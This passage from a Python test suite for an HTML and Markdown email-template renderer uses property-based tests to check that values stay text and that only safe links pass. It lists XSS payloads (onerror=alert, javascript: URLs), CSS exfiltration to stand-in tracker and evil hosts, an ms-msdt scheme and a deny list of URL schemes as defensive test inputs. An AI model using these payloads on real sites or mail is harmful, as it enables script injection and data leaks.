    with one of their own kind: the same empty or white-space value, else :data:`MARKER`.
    """

    visible = UNPRINTED.sub("", value)  # what prepare() leaves of it
    return value if not visible.strip(_HTML_SPACE) else MARKER


def _assert_value_stays_text(
    marker_html: str, hostile_html: str, value: str, *, scriptings: tuple[bool, ...] = (False, True),
) -> None:
    """Property 1: ``value`` adds no element, attribute or comment, no text in style or script, a link only by ``url``.

    ``marker_html`` is the same rows rendered with ``_harmless(value)``. A browser's reading of both has
    the same elements, attribute names and comments, the same ``style`` and ``script`` text, and attribute values
    that differ only where the HTML checks admit an output (``title``, ``alt``…) or in a link attribute as ``url``
    makes a link of the value.
    """

    for scripting in scriptings:
        (marker, marker_raw), (hostile, hostile_raw) = (
            _reading(marker_html, scripting=scripting), _reading(hostile_html, scripting=scripting))
        assert hostile_raw == marker_raw, (hostile_raw, marker_raw)
        assert [event[:2] for event in hostile] == [event[:2] for event in marker], hostile_html
        for before, after in zip(marker, hostile, strict=True):
            if before[0] != "start":
                assert after == before
                continue
            assert [name for name, _ in after[2]] == [name for name, _ in before[2]], (before, after)
            for (name, was), (_, now) in zip(before[2], after[2], strict=True):
                linking = (before[1], name) in LINKED
                if linking and now != was:
                    # Judged apart from url itself: an absolute link of the four schemes, or none.
                    assert now == "" or now.lower().startswith(SENT_SCHEMES), (before[1], name, now)
                if name in TEXT_ATTRIBUTES or (linking and (was, now) == (url(_harmless(value)), url(value))):
                    continue
                assert now == was, (before[1], name, was, now)


def _unless_unlinkable(render: Callable[[], str], value: str) -> str | None:
    """``render()``'s HTML, or ``None`` when the render refused ``value`` as a link ``url`` would empty.

    A row printing the value through ``url`` refuses a value that is no link (``value_not_linkable``) rather than
    render it, so such a value never becomes markup: nothing is rendered. Any other refusal is the test's failure.
    """

    try:
        return render()
    except ValidationError as refusal:
        assert [item.code for item in refusal.error_list] == [VALUE_NOT_LINKABLE], refusal
        assert UNPRINTED.sub("", value).strip() and url(UNPRINTED.sub("", value)) == "", value
        return None


class _Rows:
    """A reader over unsaved rows, so a property walks rows without writing them."""

    def __init__(self, *rows: Any) -> None:
        self.rows = {row.handler.template_name(row.key): row for row in rows}

    def named_rows(self, names: Iterable[str], *, language: str) -> dict[str, Any]:
        del language
        found = {name: self.rows[name] for name in names if name in self.rows}
        for row in found.values():
            row.text_length = len(row.source) + len(row.text_source)
            row.variables_length = len(json.dumps(row.variables, ensure_ascii=False))
        return found

    def with_text(self, rows: Mapping[str, Any]) -> Mapping[str, Any]:
        return rows

    def resolving_names(self, names: Iterable[str]) -> frozenset[str]:
        return frozenset(name for name in names if name in self.rows)


SENT_SCHEMES = ("https://", "http://", "mailto:", "tel:")
LINKED = frozenset({
    ("a", "href"), ("img", "src"), ("body", "background"), ("table", "background"), ("td", "background"),
    ("th", "background"), ("blockquote", "cite"),
})
"""The element and attribute pairs where a value's url output may differ from a harmless one's: the oracle's own,
apart from the code it judges, so a link element the checks admitted by mistake fails it."""
TEXT_ATTRIBUTES = frozenset({"alt", "title", "aria-label"})
"""The attributes where a value's text may differ: the oracle's own, so a value setting dir or lang fails it."""
SPLICE = "y style=color:red onclick=alert(1)"
JAVASCRIPT = "javascript:alert(document.domain)"
CSS = "}*{background:url(https://tracker.example/leak?)}@import url(https://evil.example/x.css);"
CUT = "aaaaaa\nx onmouseover=alert(1) style=background:url(https://tracker.example/leak);x:"
HOSTILE = [
    SPLICE, JAVASCRIPT, CSS, '"><b onclick=x>', "</style><b onclick=x>", "' onclick=x '", "-->", "]]>", "x\x00y",
    "/", "/ onerror=alert(1)", ";background-image:url(https://tracker.example/leak)", CUT,
    "1;alert(document.domain)//", "ms-msdt:/id PCWDiagnostic", "//evil.example/x", "/settings/forward",
    "\x1b$B\"><b onclick=x>", "\x00", "\x1b\x0c\x00", " ", "", "\n\n", "\U0001f600", "&amp;quot;",
    "</title><img src=x onerror=alert(1)>",
]
"""Values of every kind: attribute and element splices, schemes, CSS, a cut line break, control characters and a
value of controls alone, white space, empty."""

_ATTRIBUTE = st.builds(
    lambda gap, name, quoting, value: gap + name + quoting.format(value),
    st.sampled_from([" ", "\n", "\t", "\x0c", "\r", "\x0b", "\xa0", "/", "", "\x00"]),
    st.sampled_from(["title", "TITLE", "alt", "href", "style", "class", "=x", 'x"', "lang", "dir", "src"]),
    st.sampled_from(['="{}"', "='{}'", "={}", ' = "{}"', '="{}"\x0b', '\x0c="{}"', '="{}"/']),
    st.sampled_from(["x", "{{ v }}", "{{ v|url }}", "{{ v|upper }}", "{% if v %}{{ v }}{% endif %}",
                     "color:{{ brand.light.text }}", "a>b", "&amp;", "&quot;", ""]),
)
_START_TAG = st.builds(
    lambda tag, attributes, end: "<" + tag + "".join(attributes) + end,
    st.sampled_from(["p", "span", "a", "td", "table", "tr", "select", "option", "style", "title", "img", "b", "div",
                     "STYLE", "Title", "br", "noscript", "xmp", "textarea"]),
    st.lists(_ATTRIBUTE, max_size=2),
    st.sampled_from([">", "/>", " />", " / >", "//>", "\x0b>", "\r>", "\xa0>", ""]),
)
_PLAIN_TAG = st.builds(
    lambda tag, attributes, end: "<" + tag + "".join(attributes) + end,
    st.sampled_from(["p", "span", "a", "td", "table", "tr", "b", "div", "img", "br", "title", "style"]),
    st.lists(st.builds(
        lambda name, quoting, value: f" {name}" + quoting.format(value),
        st.sampled_from(["title", "alt", "href", "style", "class", "lang", "src"]),
        st.sampled_from(['="{}"'] * 6 + ["={}", "='{}'"]),
        st.sampled_from(["x", "{{ v }}", "{{ v|url }}", "{% if v %}{{ v }}{% endif %}", "color:{{ brand.light.text }}",
                         "&amp;", ""]),
    ), max_size=2, unique_by=lambda attribute: attribute.split("=", 1)[0]),
    st.sampled_from([">", " />"]),
)
"""Tags spelled as the checks admit them, so that admitted compositions are drawn often enough to matter, a value
now and then unquoted or single-quoted."""
FAMILIES: list[tuple[dict[str, str], str]] = [
    ({"before": "<script>var a = 1; {{ v }}</script>"}, "1;alert(document.domain)//"),
    ({"before": "<svg><style>{{ v }}</style></svg>"}, CSS),
    ({"before": "<math><mi><style>{{ v }}</style></mi></math>"}, CSS),
    ({"before": '<frameset rows="*"><frame src="{{ v|url }}"></frameset>'}, "https://evil.example/page"),
    ({"before": "<p title={{ v }}>x</p>"}, SPLICE),
    ({"before": "<p title='{{ v }}'>x</p>"}, "' onclick=x '"),
    ({"before": '<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ v }}">y</p>'},
     ";background-image:url(https://tracker.example/leak)"),
    ({"before": '<title>Hi</title{{ v }}><img alt={{ v }} src="https://example.test/x.png"></title>'},
     "/ onerror=alert(1)"),
    ({"block": "<p>Hi</p><style/>", "after": "<p>Hello {{ v }}, welcome.</p>"}, CSS),
    ({"head": "<p>Hi</p><style/>", "after": "<p>Hello {{ v }}.</p>"}, CSS),
    ({"block": "<p>Hi</p><style>", "after": "Hello {{ v }}, welcome."}, CSS),
    ({"block": "<p>Hi</p><a", "after": ' href="{{ v }}" style="background:url({{ v }})">Open</a>'}, JAVASCRIPT),
    ({"block": '<p>Hi</p><a title="x', "after": '" href="{{ v }}">Open</a>'}, JAVASCRIPT),
    ({"before": "<p>{{ v|linebreaksbr|truncatechars:3 }} {{ v }}</p>"}, "\n" + SPLICE),
    ({"before": '<a href="{{ v|url }}">x</a>'}, "ms-msdt:/id PCWDiagnostic"),
    ({"head": '<meta charset="iso-2022-jp">', "before": '<p title="{{ v }}">x</p>'}, '\x1b$B"><b onclick=x>'),
    ({"before": '<a href="{{ v }}">Open</a>'}, JAVASCRIPT),
    ({"before": "<p><{{ v }}</p>"}, "img src=x onerror=alert(document.domain) "),
    ({"before": '<link rel="stylesheet" href="{{ v|url }}"><p>Hi</p>'}, "https://evil.example/steal.css"),
    ({"before": "<p>{{ v|linebreaksbr }}</p>"}, "a\n<img src=x onerror=alert(document.domain)>"),
    ({"before": '<p dir="{{ v }}" lang="{{ v }}">x</p>'}, "rtl"),
]
"""Each family the closed lists refuse, as the row parts it takes and the value that shows what it would break: an
element off the list holding a value, an unquoted or single-quoted output, a NUL forging a placeholder, a < in a
title, a self-closing or unclosed style, a row ending inside a tag, a markup filter cut, a scheme off the list, a
character set other than UTF-8, a bare output in a link, a < before an output in text, a link element, a markup
filter's input, a value in dir or lang."""

_REFUSED = st.sampled_from([
    # Rule 7: elements off the list, each holding a value where a reader would not read text.
    *(f"<{tag}>{{{{ v }}}}</{tag}>" for tag in (
        "script", "iframe", "noembed", "noframes", "xmp", "textarea", "template", "select", "plaintext", "object")),
    "<script>var a = 1; {{ v }}</script>", "<svg><style>{{ v }}</style></svg>", "<math><mi>{{ v }}</mi></math>",
    '<frameset rows="*"><frame src="{{ v|url }}"></frameset>',
    # Rule 3: an output unquoted or single-quoted.
    "<p title={{ v }}>x</p>", "<p title='{{ v }}'>x</p>", '<img alt={{ v }} src="https://example.test/a.png">',
    # Rule 1: a literal NUL forging the placeholder of an output the style admits.
    '<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ v }}">y</p>',
    # Rules 2 and 6: a < inside a title that ends where a reader would not end it.
    '<title>Hi</title{{ v }}><img alt={{ v }} src="https://example.test/x.png"></title>',
    # Rule 4: a style closed with a slash a reader ignores.
    "<style/><p>{{ v }}</p>",
    # Filters: a markup filter cut by the next one.
    *(f"<p>{{{{ v|linebreaksbr|truncatechars:{size} }}}} {{{{ v }}}}</p>" for size in (8, 9, 10)),
    # Links and the character set.
    '<a href="{{ v|url }}">x</a>', '<meta charset="iso-2022-jp">',
])
"""One piece of each family the closed lists refuse, drawn often enough that a dropped rule admits one."""
_PLAIN = st.sampled_from([
    "</p>", "</span>", "</a>", "</b>", "</div>", "</td>", "</tr>", "</title>", "text", "{{ v }}", "&amp;", "AT&T",
    "{% if v %}{{ v }}{% endif %}",
])
_HTML = st.lists(
    st.one_of(_PLAIN_TAG, _PLAIN_TAG, _PLAIN_TAG, _PLAIN, _PLAIN, _PLAIN, _START_TAG, _REFUSED, st.sampled_from([
        "</style>", "</style\x0b>", "</style/>", "</table>", "</select>", '"', "'", ">", "<", "&", "&lt", "\n",
        "<!--x-->", "<!x>", "</ x>", "<?x>", "</>", "<![CDATA[x]]>", "<!doctype html>", '</p x="{{ v }}">', "<br/>",
        "</title{{ v }}>", "<style/>", "<!--[if mso]><b>x</b><![endif]-->", "{% if v %}", "{% endif %}",
    ])),
    max_size=5,
).map("".join)
_PART = st.one_of(st.just(""), _HTML)
"""One row's part of a composition; often empty, so that most compositions differ from an admitted one in one place."""


@settings(
    deadline=None, max_examples=3000,
    suppress_health_check=[HealthCheck.function_scoped_fixture, HealthCheck.too_slow, HealthCheck.filter_too_much],
)
@given(head=_PART, tail=_PART, before=_PART, block=_PART, after=_PART, value=st.one_of(
    st.sampled_from(HOSTILE), st.text(max_size=40)), family=st.one_of(st.none(), st.sampled_from(FAMILIES)),
    family_value=st.booleans(), alone=st.booleans())
# Rows found to break the property: a repeated attribute name and a noscript splice (S1); a row ending inside a tag
# or a <style> (S2); a self-closing <style/>, in a block and in a layout (rule 4); template code glued to </title
# (rule 6); a literal NUL forging a placeholder (rule 1).
@example(head="", tail="", before='<span title="a" title={{ v }}>x</span>', block="", after="", value=SPLICE,
         family=None, family_value=False, alone=False)
@example(head="", tail="", before='<span TITLE="a" title={{ v }}>x</span>', block="", after="", value=SPLICE,
         family=None, family_value=False, alone=False)
@example(head="", tail="", before='<noscript><p title="</noscript><b title={{ v }}>"></p></noscript>', block="",
         after="", value=SPLICE,
         family=None, family_value=False, alone=False)
@example(head="", tail="", before="", block="<p>Hi</p><a",
         after=' href="{{ v }}" style="background:url({{ v }})">Open</a>', value=JAVASCRIPT,
         family=None, family_value=False, alone=False)
@example(head="", tail="", before="", block='<p>Hi</p><a title="x', after='" href="{{ v }}">Open</a>',
         value=JAVASCRIPT,
         family=None, family_value=False, alone=False)
@example(head="", tail="", before="", block="<p>Hi</p><style>", after="Hello {{ v }}, welcome.", value=CSS,
         family=None, family_value=False, alone=False)
@example(head="", tail="", before="", block="<p>Hi</p><style/>", after="<p>Hello {{ v }}, welcome.</p>", value=CSS,
         family=None, family_value=False, alone=False)
@example(head="<p>Hi</p><style/>", tail="", before="", block="", after="<p>Hello {{ v }}, welcome.</p>", value=CSS,
         family=None, family_value=False, alone=False)
@example(head="", tail="", before='<title>Hi</title{{ v }}><img alt={{ v }} src="https://example.test/x.png"></title>',
         block="", after="<p>Body</p>", value="/ onerror=alert(1)",
         family=None, family_value=False, alone=False)
@example(head="", tail="", before='<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ v }}">y</p>',
         block="", after="", value=";background-image:url(https://tracker.example/leak)",
         family=None, family_value=False, alone=False)
def test_a_value_never_becomes_markup(
    kit: Any, head: str, tail: str, before: str, block: str, after: str, value: str,
    family: tuple[dict[str, str], str] | None, family_value: bool, alone: bool,
) -> None:
    """Property 1, over the rows the walk admits, read as a browser reads them (html5lib).

    The rows meet as a layout around a template and a template around an included block, each drawn from tags in
    every quoting, spelling and whitespace of their attributes, self-closing and raw-text elements, comments,
    declarations, entities and template code, ending anywhere. Half the compositions put one of the
    :data:`FAMILIES` the closed lists refuse in place of the parts it names, half of those with the value that shows
    what it would break and half alone in the composition, so that dropping any rule admits a break the generated
    examples alone find.
    """

    if family is not None:
        overrides, shown = family
        parts = {"head": head, "tail": tail, "before": before, "block": block, "after": after}
        parts = {**(dict.fromkeys(parts, "") if alone else parts), **overrides}
        head, tail, before, block, after = (parts[name] for name in ("head", "tail", "before", "block", "after"))
        value = shown if family_value else value
    template = _unsaved(
        format="html", source=before + '{% include "blocks/probe" with v=v only %}' + after, text_source="{{ v }}",
        variables={"v": "x"}, layout="probe",
    )
    rows = _Rows(
        template, _unsaved("block", "probe", source=block, text_source="x", variables={"v": "x"}),
        _unsaved("layout", "probe", source=head + "{% block content %}{% endblock %}" + tail, text_source=PLAIN_TEXT,
                 variables={"v": "x"}),
    )
    try:
        walk = TemplateWalker(saving=True).walk(template, rows)
    except ValidationError:
        event("refused")
        return  # a refused row never renders
    event("admitted")
    hostile = _unless_unlinkable(lambda: walk.render({"v": value}, kit=kit).html, value)
    if hostile is None:
        event("refused as a link")
        return
    _assert_value_stays_text(walk.render({"v": _harmless(value)}, kit=kit).html, hostile, value)


_MARKDOWN = st.lists(st.sampled_from([
    "{{ v }}", "[a]({{ v }})", "![a]({{ v }})", "[{{ v }}](https://example.test/)", "<{{ v }}>", "[a](<{{ v }}>)",
    "`x`", "**b**", "<b>raw</b>", "<!-- c -->", "<style>", "<style/>", "\n\n", "\n", "- ", "> ", "# ", "    ",
    '{% include "blocks/probe" with v=v only %}', "{% if v %}", "{% endif %}", "[r]: https://example.test/",
    "&amp;", "&", "<", ">", '"', "https://example.test/{{ v }}", "\\\\",
]), min_size=1, max_size=7).map("".join)


@settings(deadline=None, max_examples=150, suppress_health_check=[HealthCheck.function_scoped_fixture])
@given(source=_MARKDOWN, head=_HTML, value=st.one_of(st.sampled_from(HOSTILE), st.text(max_size=40)))
@example(source="Hello **{{ v }}**.", head="<style/>", value=CSS)
def test_a_value_never_becomes_markup_through_markdown(kit: Any, source: str, head: str, value: str) -> None:
    """Property 1 for Markdown templates, in a layout whose head is drawn too, read as a browser reads them."""

    template = _unsaved(source=source, variables={"v": "x"}, layout="probe")
    rows = _Rows(
        template, _unsaved("block", "probe", source="<b>{{ v }}</b>", text_source="x", variables={"v": "x"}),
        _unsaved("layout", "probe", source=head + "{% block content %}{% endblock %}", text_source=PLAIN_TEXT),
    )
    try:
        walk = TemplateWalker(saving=True).walk(template, rows)
    except ValidationError:
        return
    hostile = _unless_unlinkable(lambda: walk.render({"v": value}, kit=kit).html, value)
    if hostile is not None:
        _assert_value_stays_text(walk.render({"v": _harmless(value)}, kit=kit).html, hostile, value)


PROPERTY_SOURCE = (
    '<p>{{ v }}|{% with w=v %}{{ w }}{% endwith %}|{% include "blocks/echo" with x=v only %}|'
    "{% for i in items %}{{ i }}{% endfor %}|{{ v|default:'d' }}|{{ v|upper }}|{{ v|lower }}|{{ v|capfirst }}|"
    "{{ v|title }}|{{ v|truncatechars:20 }}|{{ v|truncatewords:3 }}|{{ v|linebreaksbr }}|{{ v|length }}|"
    "{{ when|date }}|{{ v|floatformat }}|{{ v|pluralize }}|{{ v|yesno }}</p>"
)
PROPERTY_LINKS = (
    '<a href="{{ v|url }}" title="{{ v }}">{{ v|url }}</a><img alt="{{ v|upper }}" src="{{ v|default:\'\'|url }}" />'
)
"""The paths a value takes through ``url``, in a row of their own: a value that is no link is refused there, and
:data:`PROPERTY_SOURCE` still renders it through every other filter."""


@settings(deadline=None, max_examples=40, suppress_health_check=[HealthCheck.function_scoped_fixture])
@given(value=st.text(max_size=60))
def test_a_value_never_becomes_markup_through_any_filter(plain: Any, kit: Any, value: str) -> None:
    """Property 1, through every filter and every path a value takes: output, alias, argument, item, default."""

    del plain
    with system_context(reason="tests.messaging_templates.render.property"):
        if not MessageTemplate.objects.filter(key="echo").exists():
            _row("block", "echo", source="<i>{{ x }}</i>", text_source="{{ x }}", variables={"x": "x"})
            _mail(PROPERTY_SOURCE, {"v": "x", "items.*": "x", "when": "x"}, format="html", text_source="{{ v }}",
                  key="tests.property")
            _mail(PROPERTY_LINKS, {"v": "x"}, format="html", text_source="{{ v }}", key="tests.property_links")
        template = MessageTemplate.objects.get(key="tests.property")
        links = MessageTemplate.objects.get(key="tests.property_links")
    for candidate in (value, SafeString(value), mark_safe("<b>" + value + "</b>")):
        harmless = _harmless(str(candidate))
        marker = _render(template, {"v": harmless, "items": [harmless], "when": "2026-11-24"}, kit).html
        rendered = _render(template, {"v": candidate, "items": [candidate], "when": "2026-11-24"}, kit)
        _assert_value_stays_text(marker, rendered.html, str(candidate))
        linked = _unless_unlinkable(lambda: _render(links, {"v": candidate}, kit).html, str(candidate))
        if linked is not None:
            _assert_value_stays_text(_render(links, {"v": harmless}, kit).html, linked, str(candidate))


TRUNCATING_SENDER = "x onmouseover=alert(document.domain) style=background:url(https://tracker.example/leak);x:"


def test_a_cut_line_break_is_refused_since_markup_is_the_last_filter(plain: Any, kit: Any) -> None:
    """linebreaksbr then truncatechars cut a <br> open and the next output became an attribute: refused, as is a
    markup filter's output handed to a filter through with, an include argument or a test."""

    del plain
    source = "<p>{{ message|linebreaksbr|truncatechars:200 }} — {{ sender }}</p>"
    row = _unsaved(format="html", source=source, text_source="{{ message }} {{ sender }}",
                   variables={"message": "x", "sender": "x"})
    rule = "linebreaksbr writes markup, so it is the last filter of a printed value"
    assert any(rule in refusal for refusal in _refusals(row)), _refusals(row)
    for bound in (
        "{% with b=message|linebreaksbr %}<p>{{ b|truncatechars:9 }}{{ sender }}</p>{% endwith %}",
        '{% include "blocks/cut" with body=message|linebreaksbr only %}{{ sender }}',
        "{% if message|linebreaksbr %}<p>{{ sender }}</p>{% endif %}",
    ):
        row = _unsaved(format="html", source=bound, text_source="x", variables={"message": "x", "sender": "x"})
        rows = _Rows(row, _unsaved("block", "cut", source="<p>{{ body|truncatechars:9 }}</p>", text_source="x",
                                   variables={"body": "x"}))
        refusals = TemplateWalker(saving=True).judge(row, rows).refusals
        assert any(rule in refusal for refusal in refusals), (bound, refusals)
    admitted = _mail("<p>{{ message|linebreaksbr }} — {{ sender }}</p>", {"message": "x", "sender": "x"},
                     format="html", text_source="{{ message }} {{ sender }}")
    html = _render(admitted, {"message": "a" * 196 + "\nx", "sender": TRUNCATING_SENDER}, kit).html
    assert "<br>x — x onmouseover=alert(document.domain)" in html


def test_only_a_markup_filter_returns_markup(plain: Any, kit: Any) -> None:
    """A filter's result is escaped though Django's filter hands on a safe input, marks its own result safe or returns
    its literal argument; a literal printed alone holds no <, > or "."""

    del plain
    template = _mail(
        "<p>{{ v|default:'Q&A'|lower }}|{{ n|floatformat }}|{{ v|default:'a&amp;b' }}|{{ 'Q&A' }}</p>",
        {"v": "x", "n": "x"}, format="html", text_source="x",
    )
    html = _render(template, {"v": "", "n": 1.5}, kit).html
    assert "<p>q&amp;a|1.5|a&amp;amp;b|Q&A</p>" in html
    assert any("holds <, > or" in refusal for refusal in _refusals(_unsaved(
        format="html", source="<p>{{ '<b>' }}</p>", text_source="x")))


CHAIN_FILTERS = [
    "default:'d'", "upper", "lower", "capfirst", "title", "truncatechars:9", "truncatechars:10", "truncatechars:11",
    "truncatewords:2", "linebreaksbr", "length", "floatformat", "pluralize", "yesno:'a,b'",
]
"""Every filter that reads a string, with arguments that cut where linebreaksbr writes <br>."""
CHAIN_MESSAGES = ["aaaaaa\nbb cc", "aaaaaaa\nbb", "aaaaaaaa\nb", "&<>\"'\n\n", "a\n\n\nb", "1.5\n2"]
CHAIN_PLACES = [
    "<p>{chain} {{{{ s }}}}</p>", '<p title="{chain}">{{{{ s }}}}</p>', "<title>{chain} {{{{ s }}}}</title><p>x</p>",
]


@pytest.mark.parametrize("longest", [2, pytest.param(3, marks=pytest.mark.skipif(
    not TIMED_RUN, reason="chains of three take a minute; ANGEE_TIMED_TESTS=1 runs them"))])
def test_no_chain_of_filters_lets_a_value_become_markup(kit: Any, longest: int) -> None:
    """Every chain of up to ``longest`` filters, in text, a double-quoted attribute and a title, before a hostile
    value, read as a browser reads it: the value stays text whatever the chain did to the message before it."""

    admitted = compared = 0
    for size in range(1, longest + 1):
        for chain in itertools.product(CHAIN_FILTERS, repeat=size):
            output = "{{ m|" + "|".join(chain) + " }}"
            for place in CHAIN_PLACES:
                template = _unsaved(format="html", source=place.format(chain=output), text_source="x",
                                    variables={"m": "x", "s": "x"}, layout="plain")
                rows = _Rows(template, _unsaved("layout", "plain", source=PLAIN_LAYOUT, text_source=PLAIN_TEXT))
                try:
                    walk = TemplateWalker(saving=True).walk(template, rows)
                except ValidationError:
                    continue
                admitted += 1
                for message in CHAIN_MESSAGES:
                    try:
                        marker = walk.render({"m": message, "s": _harmless(TRUNCATING_SENDER)}, kit=kit).html
                    except ValidationError:
                        continue  # floatformat or pluralize refuses a message no float holds
                    hostile = walk.render({"m": message, "s": TRUNCATING_SENDER}, kit=kit).html
                    _assert_value_stays_text(marker, hostile, TRUNCATING_SENDER, scriptings=(False,))
                    compared += 1
    assert admitted and compared


REFUSED_LINKS = (
    "ms-msdt:/id PCWDiagnostic /skip force", "search-ms:query=x", "ms-officecmd:x", "ms-word:ofe|u|https://x.test/a",
    "smb://evil.example/share", "intent://x#Intent;scheme=x;end", "chrome://settings", "view-source:https://x.test",
    "blob:https://x.test/1", "filesystem:https://x.test/temporary/a", "mhtml:file://x", "res://x", "about:blank",
    "jar:https://x.test!/", "feed:https://x.test", "cid:logo", "#top", "//evil.example/x", "/settings/forward",
    "settings", "https:example.test", "https:///x", "https://", "http://?x", " javascript:x", "java\tscript:x",
    "\x01javascript:x", "https://:80/x", "https://:@/", "http://.", "https://user:pw@good.example@evil.example/",
    "https://user@example.test/", "http://localhost/", "http://192.168.0.1/", "https://example.test./",
    "https://-example.test/", "https://example.t/", "https://exa_mple.test/", "sms:+15550100",
    "webcal://example.test/c.ics",
)
"""Links a value may not give: every scheme but the four, and every link a mail with no base cannot resolve."""
ADMITTED_LINKS = {
    "https://example.test/a?b=1&c=2": "https://example.test/a?b=1&amp;c=2",
    "HTTPS://Example.test/": "HTTPS://Example.test/",
    " http://example.test/x ": "http://example.test/x",
    "https://example.test/café": "https://example.test/caf%C3%A9",
    "https://bücher.example/a b": "https://xn--bcher-kva.example/a%20b",
    "mailto:hello@example.test?subject=Hi there": "mailto:hello@example.test?subject=Hi%20there",
    "tel:+1-555-0100": "tel:+1-555-0100",
    "https://mail.example.co.uk:8443/a#b": "https://mail.example.co.uk:8443/a#b",
}
"""Values url makes links of, percent-encoded and in punycode as markdown-it writes them, then escaped."""


def test_a_url_value_gives_a_link_or_the_render_is_refused(plain: Any, kit: Any) -> None:
    """Property 3: a value gives an absolute https, http, mailto or tel link; ``url`` gives any other value no link,
    and a render refuses it rather than send an empty target; a blank value leaves it empty; a quote cannot leave an
    attribute."""

    del plain
    template = _mail('<a href="{{ link|url }}">x</a>', {"link": "x"}, format="html", text_source="{{ link|url }}")
    for link in ("javascript:alert(1)", "JaVaScRiPt:alert(1)", "vbscript:x", "file:///etc/passwd",
                 "data:text/html,x", "data:image/png;base64,AAAA", "https://" + "a" * 2_050, *REFUSED_LINKS):
        assert url(link) == "", link
        with pytest.raises(ValidationError) as refusal:
            _render(template, {"link": link}, kit)
        assert [item.code for item in refusal.value.error_list] == [VALUE_NOT_LINKABLE], link
    assert 'href=""' in _render(template, {"link": " "}, kit).html
    for link, sent in ADMITTED_LINKS.items():
        assert f'href="{sent}"' in _render(template, {"link": link}, kit).html, link
    rendered = _render(template, {"link": 'https://example.test/" onclick="x'}, kit)
    marker = _render(template, {"link": MARKER}, kit).html
    _assert_value_stays_text(marker, rendered.html, 'https://example.test/" onclick="x')
    assert url("https://example.test/") == "https://example.test/"


def test_method_fallback_closed(plain: Any, kit: Any) -> None:
    """Property 4 (p1, q6): a lookup lands on a key; a dict's, list's or str's methods are never reached."""

    del plain
    names = ("items", "values", "keys", "popitem", "clear")
    template = _mail(
        "".join(f"[{{{{ order.{name}|default:'' }}}}]{{% if order.{name} %}}T{{% endif %}}" for name in names)
        + "{{ order.total }}",
        {**{f"order.{name}": "x" for name in names}, "order.total": "x"},
    )
    rendered = _render(template, {"order": {"total": 3, "card_last4": "4242", "email": "x@example.test"}}, kit)
    assert "[][][][][]3" in rendered.plain_text and "4242" not in rendered.html
    for source in ("{{ name.upper }}", "{{ items.clear }}", "{{ block.context }}", "{{ block.super }}"):
        assert _refusals(_unsaved(source=source, variables={"name": "x", "items.*": "x"})), source
    _row("part", "split", source="[{{ person.split|default:'' }}]", variables={"person.split": "x"})
    _row("block", "isolated", source="<b>{{ brand.name }}{{ lang }}{{ dir }}{% if secret %}{{ secret }}{% endif %}</b>",
         text_source="x", variables={"secret": "x"})
    through = _mail('{% include "parts/split" with person=recipient only %}\n\n{% include "blocks/isolated" only %}',
                    {"recipient.split": "x", "secret": "x"}, key="tests.through")
    rendered = _render(through, {"secret": "kept out"}, kit)
    assert "[]" in rendered.plain_text and "<b>Acmeenltr</b>" in rendered.html and "kept out" not in rendered.html
    assert any("both as a list and as an object" in message for message in _refusals(_unsaved(
        source="x", variables={"items.*": "x", "items.pop": "x"})))


def test_required_values_and_shapes(plain: Any, kit: Any) -> None:
    """Property 5: a required value missing or null refuses the send, naming it; shapes and JSON are checked."""

    del plain
    template = _mail(
        "{{ order.total }} [{{ note|default:'' }}] [{% if coupon %}{{ coupon }}{% endif %}]",
        {"order.total": "x", "note": "x", "coupon": "x"},
    )
    for values, refusal in (
        ({}, "order.total is required"),
        ({"order": {"total": None}}, "order.total is required"),
        ({"order": "x"}, "order is an object"),
        ({"order": {"total": object()}}, "not JSON"),
        ({"order": {"total": 1}, "brand": "x"}, "brand is a name the mail supplies"),
    ):
        with pytest.raises(ValidationError, match=refusal):
            _render(template, values, kit)
    rendered = _render(template, {"order": {"total": 3}, "coupon": None, "note": None}, kit)
    assert "3 [] []" in rendered.plain_text and "None" not in rendered.html
    both = _mail("Hi {{ person.first_name }}, {{ name }}.", {"person.first_name": "x", "name": "x"}, key="tests.both")
    with pytest.raises(ValidationError) as refusal:  # a path under the wrong shape is its consequence, not missing
        _render(both, {"person": "flat"}, kit)
    assert [(item.messages[0], item.params[REFUSAL_SOURCE]) for item in refusal.value.error_list] == [
        ("person is an object.", RefusalSource.VALUES),
        ("name is required and missing or null.", RefusalSource.TEMPLATE),
    ]
    listed = _mail("{% for item in items %}{{ item.name }}{% endfor %}", {"items.*.name": "x"}, key="tests.listed")
    for values, refusals in (  # a mis-shaped item hides the paths under it, never its siblings'
        ({"items": ["flat", {}]}, [("items.* is an object.", RefusalSource.VALUES),
                                   ("items.*.name is required and missing or null.", RefusalSource.TEMPLATE)]),
        ({"items": ["flat", {"name": "Ana"}]}, [("items.* is an object.", RefusalSource.VALUES)]),
    ):
        with pytest.raises(ValidationError) as refusal:
            _render(listed, values, kit)
        assert [(item.messages[0], item.params[REFUSAL_SOURCE]) for item in refusal.value.error_list] == refusals
    rendered = _render(template, {"order": {"total": SafeString("<b>3</b>")}}, kit)
    assert "&lt;b&gt;3&lt;/b&gt;" in rendered.html


REQUIRED = {"question.asked_by.name": "x", "items.*.name": "x"}
ASKED = {"question": {"asked_by": {"name": "Ana"}}}


@pytest.mark.parametrize(("values", "lacking"), [
    pytest.param({"question": {"asked_by": {"name": None}}}, [("question.asked_by.name", "values")],
                 id="the-leaf-null"),
    pytest.param({"question": {"asked_by": None}}, [("question.asked_by.name", "values")], id="a-parent-null"),
    pytest.param({"question": None}, [("question.asked_by.name", "values")], id="the-root-null"),
    pytest.param({"question": {"asked_by": {}}}, [("question.asked_by.name", "template")],
                 id="an-object-without-the-member"),
    pytest.param({"question": {}}, [("question.asked_by.name", "template")], id="a-parent-absent"),
    pytest.param({}, [("question.asked_by.name", "template")], id="nothing-set"),
    pytest.param({**ASKED, "items": [None]}, [("items.*.name", "values")], id="a-list-item-null"),
    pytest.param({**ASKED, "items": [{"name": None}]}, [("items.*.name", "values")], id="an-items-member-null"),
    pytest.param({**ASKED, "items": [{}]}, [("items.*.name", "template")], id="an-item-without-the-member"),
    pytest.param({**ASKED, "items": [{"name": None}, {}]}, [("items.*.name", "template")],
                 id="one-item-null-and-one-without-the-member"),
    pytest.param({"question": {"asked_by": {"name": None}}, "items": [{}]},
                 [("question.asked_by.name", "values"), ("items.*.name", "template")], id="one-of-each"),
    pytest.param({"question": {"asked_by": {"name": ""}}, "items": []}, [], id="an-empty-string-and-an-empty-list"),
    pytest.param({**ASKED, "items": None}, [], id="a-null-list"),
    pytest.param(ASKED, [], id="an-absent-list"),
])
